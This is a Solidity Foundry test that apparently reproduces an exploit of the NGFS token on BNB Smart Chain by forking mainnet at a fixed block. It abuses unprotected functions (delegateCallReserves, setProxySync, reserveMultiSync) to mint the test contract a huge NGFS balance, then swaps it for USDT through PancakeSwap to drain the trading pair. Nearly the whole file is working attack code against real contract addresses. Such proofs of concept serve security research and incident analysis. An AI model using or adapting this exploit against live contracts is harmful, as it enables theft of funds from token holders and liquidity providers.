// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IPancakeV2.sol";

import "./INgfs.sol";

IPancakeFactoryV2 constant PancakeFactoryV2 = IPancakeFactoryV2(
    0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
);
IPancakeRouterV2 constant PancakeV2Router = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);
INgfs constant NGFS = INgfs(
    payable(0xa608985f5b40CDf6862bEC775207f84280a91E3A)
);

IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

contract NGFSTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 38167373 - 1);
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "USDT balance",
            USDT.balanceOf(address(this)),
            USDT.decimals()
        );

        fuckyou();

        emit log_named_decimal_uint(
            "USDT balance",
            USDT.balanceOf(address(this)),
            USDT.decimals()
        );
    }

    function fuckyou() public {
        address pair = PancakeFactoryV2.getPair(address(NGFS), address(USDT));
        NGFS.delegateCallReserves();
        NGFS.setProxySync(address(this));

        uint256 syncAmount = NGFS.balanceOf(pair);
        NGFS.reserveMultiSync(address(this), syncAmount * 100);

        emit log_named_decimal_uint(
            "NGFS balance",
            NGFS.balanceOf(address(this)),
            NGFS.decimals()
        );
        emit log_named_decimal_uint(
            "NGFS pair USDT",
            USDT.balanceOf(pair),
            USDT.decimals()
        );

        address[] memory path = new address[](2);
        path[0] = address(NGFS);
        path[1] = address(USDT);
        NGFS.approve(address(PancakeV2Router), type(uint256).max);
        PancakeV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            NGFS.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 1
        );
    }
}
